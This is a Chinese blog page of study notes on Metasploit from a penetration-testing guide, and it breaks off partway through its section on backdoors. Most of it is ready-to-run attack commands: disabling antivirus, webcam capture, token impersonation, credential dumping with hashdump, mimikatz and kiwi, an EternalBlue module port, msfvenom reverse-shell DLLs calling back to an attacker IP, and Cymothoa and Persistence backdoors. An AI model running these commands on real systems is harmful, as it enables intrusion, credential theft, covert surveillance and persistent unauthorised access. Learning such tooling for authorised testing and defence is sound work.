@@ -1,0 +1,709 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Bsmslwx">
+  <meta name="keywords" content="">
+  
+  <title>渗透测试实战指南-Metasploit技术 ~ BsmslwxBlog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":80,"cursorChar":".","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Bsmslwx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg4.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="渗透测试实战指南-Metasploit技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-02 10:12" pubdate>
+        2021年8月2日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.8k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">渗透测试实战指南-Metasploit技术</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年9月24日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="Metasploit技术"><a href="#Metasploit技术" class="headerlink" title="Metasploit技术"></a>Metasploit技术</h1><h1 id="1-Metasploit基础"><a href="#1-Metasploit基础" class="headerlink" title="1. Metasploit基础"></a>1. Metasploit基础</h1><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板</p>
+<p>MSF框架由多个模块组成，各个模块如下</p>
+<ol>
+<li><p>Auxiliaries(辅助模块)</p>
+<p>模块负责执行扫描、嗅探、指纹识别等相关功能进行辅助渗透测试</p>
+</li>
+<li><p>Exploit(漏洞利用模块)</p>
+<p> 由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含针对系统漏洞设计的各种POC验证程序</p>
+</li>
+<li><p>Playload(攻击载荷模块)</p>
+<p> 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等</p>
+</li>
+<li><p>Post(后渗透模块)</p>
+<p> 用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息，实施跳板攻击等</p>
+</li>
+<li><p> Encoders(编码工具模块)</p>
+</li>
+</ol>
+<p>渗透攻击步骤</p>
+<ul>
+<li>扫描目标机系统，寻找可用漏洞</li>
+<li>选择并配置一个漏洞利用模块</li>
+<li>选择并配置一个攻击载荷模块</li>
+<li>选择编码技术绕过杀毒软件的查杀</li>
+<li>渗透攻击</li>
+</ul>
+<p>基本命令学习</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># use使用模块</span><br>use 模块<br><span class="hljs-comment"># show options 查看对应模块需要输入的参数等等</span><br>show options<br><span class="hljs-comment"># 设置或取消全局性的参数值</span><br>setg 命令<br>unsetg 命令<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2. 主机扫描"></a>2. 主机扫描</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 端口扫描<br>search portscan<br># 扫描模块<br>search scanner<br></code></pre></div></td></tr></table></figure>
+
+<p>利用搜索出来的辅助模块进行扫描</p>
+<h1 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.  漏洞利用"></a>3.  漏洞利用</h1><p>根据目标服务器搜索对应的漏洞，之后进行漏洞的利用</p>
+<h1 id="4-后渗透攻击"><a href="#4-后渗透攻击" class="headerlink" title="4. 后渗透攻击"></a>4. 后渗透攻击</h1><h2 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1 信息收集"></a>4.1 信息收集</h2><p>help查看帮助命令</p>
+<p>获取shell之后需要将其和目标机中的一个稳定的进程绑定</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 获取正在运行的进程</span><br>ps<br><span class="hljs-comment"># 查看Meterpreter Shell的进程号</span><br>getpid<br><span class="hljs-comment"># 将shell移动到其它进程中，此处以Explorer.exe pid：448为例</span><br>migrate 448<br><span class="hljs-comment"># 此时使用getpid可以看到已经变为448，原进程应该是自动关闭，如果没有则使用</span><br><span class="hljs-built_in">kill</span> 原PID<br><span class="hljs-comment"># 也可使用自动迁移进程命令</span><br>run post/windows/manage/migrate<br></code></pre></div></td></tr></table></figure>
+
+<p>收集系统信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标机的系统信息</span><br>sysinfo<br><span class="hljs-comment"># 查看是否运行在虚拟机上</span><br>run post/windows/gather/checkvm<br><span class="hljs-comment"># 查看目标机最近的运行时间</span><br>idletime<br><span class="hljs-comment"># 查看完整的网络设置</span><br>route<br><span class="hljs-comment"># background 将会话放到后台</span><br><span class="hljs-comment"># getuid 查看当前用户及权限</span><br><span class="hljs-comment"># 关闭目标机系统杀毒软件</span><br>run post/windows/manage/killav<br><span class="hljs-comment"># 启动远程桌面协议</span><br>run post/windows/manage/enable_rdp<br><span class="hljs-comment"># 查看目标机的本地子网情况</span><br>run post/windows/manage/autoroute<br></code></pre></div></td></tr></table></figure>
+
+<p>此处按照书籍简述</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先使用background将终端隐藏在后台</span><br>background<br><span class="hljs-comment"># 添加路由</span><br>route add 192.168.66.0 255.255.255.0 1<br><span class="hljs-comment"># 查看路由</span><br>route <span class="hljs-built_in">print</span><br><span class="hljs-comment"># 列举当前多少用户登录目标机</span><br>run post/windows/gather/enum_logged_on_users<br><span class="hljs-comment"># 列举安装在目标机上的应用程序</span><br>run post/windows/gather/enum_applications<br><span class="hljs-comment"># 抓取自动登录用户的用户名和密码</span><br>run windows/gather/credentials/windows_autologin <span class="hljs-comment"># 此处需要用到插件Espia应提前加载</span><br><span class="hljs-comment"># 加载插件</span><br>load espia<br><span class="hljs-comment"># 获取截图</span><br>screengrab<br><span class="hljs-comment"># 或</span><br>screenshot<br></code></pre></div></td></tr></table></figure>
+
+<p>比较有趣的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标机是否有摄像头</span><br>webcam_list<br><span class="hljs-comment"># 开启摄像头并拍照</span><br>webcam_snap<br><span class="hljs-comment"># 开启直播模式</span><br>webcam_stream<br><span class="hljs-comment"># 命令行shell</span><br>shell<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="4-2-文件系统命令"><a href="#4-2-文件系统命令" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录</span><br><span class="hljs-built_in">pwd</span> 或 getwd<br><span class="hljs-comment"># 查看当前属于本地那个目录</span><br>getlwd<br><span class="hljs-comment"># 搜索以txt为扩展名的文件</span><br><span class="hljs-comment"># -f 表示用户指定搜索文件模式</span><br><span class="hljs-comment"># -d 用于指定再那个目录下进行搜索</span><br>search -f *.txt -d c:\<br><span class="hljs-comment"># 下载目标机的内容到本机</span><br>download c:\text.txt /root<br><span class="hljs-comment"># 上传文件到目标机</span><br>upload /root/text.txt c:\ <br></code></pre></div></td></tr></table></figure>
+
+<h2 id="4-3-权限提升"><a href="#4-3-权限提升" class="headerlink" title="4.3 权限提升"></a>4.3 权限提升</h2><p>提升权限分为</p>
+<ul>
+<li>纵向提权：低权限角色获得高权限角色的权限</li>
+<li>横向提权：获取同级别角色的权限</li>
+</ul>
+<p>在windows系统中使用命令<code>whoami /groups</code>查看当前用户的权限</p>
+<p>首先使用<code>getuid</code>查看已经获取的权限</p>
+<p>尝试使用<code>getsystem</code>命令提权如果失败，根据目标机系统的情况，输入<code>systeminfo</code>命令查询，或通过查询C:\windows\里留下的补丁号”.log”查看目标机大概打了哪些补丁</p>
+<p>根据获取的内容进行查找没有打补丁的来进行提权</p>
+<p>漏洞具体信息分析和共享参考如下网站</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://www.securityfocus.com/bid">安全焦点</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.exploitdb.com/">Exploit-DB</a></li>
+</ol>
+<p><strong>知识点</strong>：WMIC是Windows Management Instrumentation Commandline的简称，是一款命令行管理工具，提供了从命令行接口到批命令脚本执行系统管理的支持</p>
+<p>使用WMIC可以管理本地计算机和同一域中的所有计算机(需要对应的权限)，且被管理远程计算机不需要事先安装WMIC</p>
+<p>WMIC.exe可以使用交互模式和非交互模式</p>
+<p>更新msf命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfupdate<br></code></pre></div></td></tr></table></figure>
+
+<p>使用提权EXP如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先切换到后台</span><br>background<br><span class="hljs-comment"># 选中对应的exploit</span><br>use windows/**<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p>其它方法</p>
+<h3 id="4-3-1-令牌窃取"><a href="#4-3-1-令牌窃取" class="headerlink" title="4.3.1 令牌窃取"></a>4.3.1 令牌窃取</h3><p>令牌(Token)是系统临时密钥，它允许在不提供密码等凭证的情况下访问网络和系统资源</p>
+<p>令牌一般是不可预测的，且密码形式较多。</p>
+<p>首先需要了解Kerberos协议，其工作机制如图</p>
+<p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804100909.png" srcset="/img/loading.gif" lazyload></p>
+<p>客户端请求过程：</p>
+<ol>
+<li>客户端向认证服务器(AS)发送请求，要求得到服务器的证书</li>
+<li>AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。改证书包括服务器ticket(包括服务器密钥加密的客户机身份和一份会话密钥)和一个临时加密密钥(又称为会话密钥，session key)。认证服务器也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份</li>
+<li>客户端将ticket传送到服务器上，服务器确认该客户端的话，允许它登录服务器</li>
+<li>客户端登录成功后，攻击者可以通过入侵服务器获取客户端的令牌</li>
+</ol>
+<p>通过假冒令牌实战</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use incognito<br><span class="hljs-comment"># 获取可用的token</span><br>list_tokens -u<br><span class="hljs-comment"># 假冒该令牌</span><br>impersonate_token 可用的token <span class="hljs-comment"># 中间使用双斜杠</span><br><br><span class="hljs-comment"># 最后查看权限</span><br>whoami<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="4-3-2-hash攻击"><a href="#4-3-2-hash攻击" class="headerlink" title="4.3.2 hash攻击"></a>4.3.2 hash攻击</h3><ol>
+<li><p>使用Hashdump抓取密码</p>
+<p>Hashdump Meterpreter脚本能够从目标机中提取Hash值，破解Hash值后即可获得登录密码，计算机中用户和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，必须需要系统级账号才能访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 获取Hash值</span><br>hashdump<br><span class="hljs-comment"># smart_hashdump功能更加强大</span><br>run windows/gether/smart_hashdump<br></code></pre></div></td></tr></table></figure>
+
+<p>smart_hashdump工作流程</p>
+<ul>
+<li>检查Meterpreter会话的权限和目标机操作系统类型</li>
+<li>检查目标机是否为域控制服务器</li>
+<li>首先尝试从注册表中读取Hash，不行再尝试注入LSASS进程</li>
+</ul>
+<p>hash破解网站</p>
+<p><a target="_blank" rel="noopener" href="http://www.cmd5com/">http://www.cmd5com/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xmd5com/">http://www.xmd5com/</a></p>
+</li>
+<li><p>使用Quarks PwDump抓取密码</p>
+<p>PwDump是win32环境下的系统授权信息导出工具</p>
+<p>目前可以导出：</p>
+<ul>
+<li>Local accounts NT/LM hashes+history(本机NT/LM哈希)+历史登录记录</li>
+<li>Domain accounts NT/LM hashes+history(域中的NT/LM哈希)+历史登录记录</li>
+<li>Cached domain password 缓存中的域管理密码</li>
+<li>Bitlocker recovery information (recovery passwords&amp;key packages) 使用Bitlocker的恢复功能后遗留发信息</li>
+</ul>
+<p>运行Quarks PwDump.exe 默认显示帮助信息</p>
+</li>
+<li><p>使用Windows Credentials Editor 抓取密码</p>
+<p>WCE是windows内网渗透工具，能够列举登录会话，并可以增加，改变，删除相关凭证(如LM/NT Hash)但是必须再管理员权限下使用，还需要注意杀毒工具的免杀</p>
+<p>上传之后，打开wce.exe 使用命令wce -w即可提取系统明文管理员的密码</p>
+<p>-f 强制使用安全的方式读取</p>
+<p>-g 计算密码</p>
+<p>-l 读取密码(安全读取无效后尝试不安全方式读取)</p>
+</li>
+<li><p>使用Minikatz抓取密码</p>
+<p>该程序已经作为一个Meterpreter脚本集成了，同样需要管理员权限运行(现在已经被kiwi替代了)</p>
+<p>在64位操作系统中需要将进程迁移到一个64位程序中才能使用查看系统密码明文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bas"># 加载插件<br>load mimikatz<br># 查看帮助<br>help mimikatz<br># 使用全部功能<br>mimikatz_command<br># 使用:语法请求某个模块可用的选项，也在选定一个模块后查看帮助<br>mimikatz_comman -f a::<br># 获取系统Hash值<br>msv<br># 抓取系统票据<br>kerberos<br># 获取系统账户信息<br>wdigest<br># 输入sandump查看可用选项 之后抓取hash<br>mimikatz_command -f samdump::hashes<br></code></pre></div></td></tr></table></figure>
+
+<p>关于mimikatz的其它内容参考<a target="_blank" rel="noopener" href="http://blog.gentilkiwi.com/">Benjamin Delpy博客</a></p>
+<p>关于kiwi的使用帮助</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">help kiwi<br>Kiwi Commands<br>=============<br>Command                Description<br>-------                -----------<br>creds_all              #列举所有凭据/所有的系统密码<br>creds_kerberos         #列举所有kerberos凭据<br>creds_msv              #列举所有msv凭据<br>creds_ssp              #列举所有ssp凭据<br>creds_tspkg            #列举所有tspkg凭据<br>creds_wdigest          #列举所有wdigest凭据<br>dcsync                 #通过DCSync检索用户帐户信息<br>dcsync_ntlm            #通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create   #创建黄金票据<br>kerberos_ticket_list   #列举kerberos票据<br>kerberos_ticket_purge  #清除kerberos票据<br>kerberos_ticket_use    #使用kerberos票据<br>kiwi_cmd               #kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令<br>lsa_dump_sam           #dump出lsa的SAM<br>lsa_dump_secrets       #dump出lsa的密文<br>password_change        #修改密码<br>wifi_list              #列出当前用户的wifi配置文件<br>wifi_list_shared       #列出共享wifi配置文件/编码<br></code></pre></div></td></tr></table></figure></li>
+</ol>
+<h2 id="4-4-移植漏洞利用代码模块"><a href="#4-4-移植漏洞利用代码模块" class="headerlink" title="4.4 移植漏洞利用代码模块"></a>4.4 移植漏洞利用代码模块</h2><p>MS17-010(“想哭”勒索软件)的漏洞利用模块Metasploit已经集成，但是不支持渗透Windows 2003系统，网上有支持的渗透脚本<a target="_blank" rel="noopener" href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar_Metasploit">GitHub地址</a></p>
+<p>将模块克隆到本地，接着将Eternalblue-Doublepulsar_Metasploit文件下的eternalblue-doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploit/windows/smb下，在MSF中，应当了解漏洞利用模块代码存储的文件夹文章。</p>
+<p>之后重新加载</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfconsole<br><span class="hljs-comment"># 重新加载全部文件</span><br>reload_all<br></code></pre></div></td></tr></table></figure>
+
+<p>攻击前需要根据目标系统生成对应的dll文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 64位</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.1 lport=2222 -f dll -o xk_64.dll<br><span class="hljs-comment"># 32位</span><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 -f dll -o xk_32.dll<br></code></pre></div></td></tr></table></figure>
+
+<p>利用该模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> processinject lsass.exe<br><span class="hljs-built_in">set</span> rhost 192.168.1.2<br><span class="hljs-built_in">set</span> targetarchitecture x86<br><span class="hljs-built_in">set</span> winepath /root/.wine/drive_c <span class="hljs-comment">#(默认DLL生成文件，可以修改)</span><br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.1<br><span class="hljs-built_in">set</span> lport 4444 <span class="hljs-comment"># (该端口不可修改，否则无法成功)</span><br><span class="hljs-built_in">set</span> target 9<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="5-后门"><a href="#5-后门" class="headerlink" title="5. 后门"></a>5. 后门</h1><p>后门是留在目标主机上的程序，使得攻击者随时连接到目标主机</p>
+<h2 id="5-1-操作系统后门"><a href="#5-1-操作系统后门" class="headerlink" title="5.1 操作系统后门"></a>5.1 操作系统后门</h2><ol>
+<li><p>Cymothoa后门</p>
+<p>Cymothoa是一款可以将ShellCode注入现有进程的后门工具</p>
+<p>利用注入手段能够将ShellCode伪装成常规程序，且与注入的程序共存。即使目标系统的安全防护工具能够监视可执行程序的完整性，只要不检查内存就发现不了后门程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标主机的进程 linux</span><br>ps -aux<br><span class="hljs-comment"># windows</span><br>tasklist<br><span class="hljs-comment"># 使用Cymothoa 通过-p指定目标进程的PID，通过-s指定ShellCode的编号</span><br><span class="hljs-comment"># 需要将Cymothoa的可执行程序复制到目标主机上，生成后门程序</span><br><span class="hljs-comment"># 此处将PID 982的进程选择为宿主进程，选用第一类ShellCode，指定payload服务端口为4444</span><br>cymothoa -p 982 -s 1 -y 4444<br><span class="hljs-comment"># 成功后通过如下命令连接</span><br>Nc -nvv 192.168.1.1 4444<br></code></pre></div></td></tr></table></figure></li>
+<li><p>Persistence 后门</p>
+<p>Persistence 是一款使用安装自启动方式的持久性后门程序，可以利用它创建注册和文件，run persistence -h 查看所有命令选项</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 语法解释</span><br><span class="hljs-comment"># A 自启动Payload程序</span><br><span class="hljs-comment"># S 系统启动时自动加载</span><br><span class="hljs-comment"># U 用户登录时自动启动</span><br><span class="hljs-comment"># X 开机时自动启动</span><br><span class="hljs-comment"># i 回连的时间间隔</span><br><span class="hljs-comment"># P 监听反向连接端口号</span><br><span class="hljs-comment"># r 目标机器的IP地址</span><br>run persistence -A -S -U -i 60 -p 4321 -r 192.168.1.1<br></code></pre></div></td></tr></table></figure>
+
+<p>此时应该会再获取一个session</p>
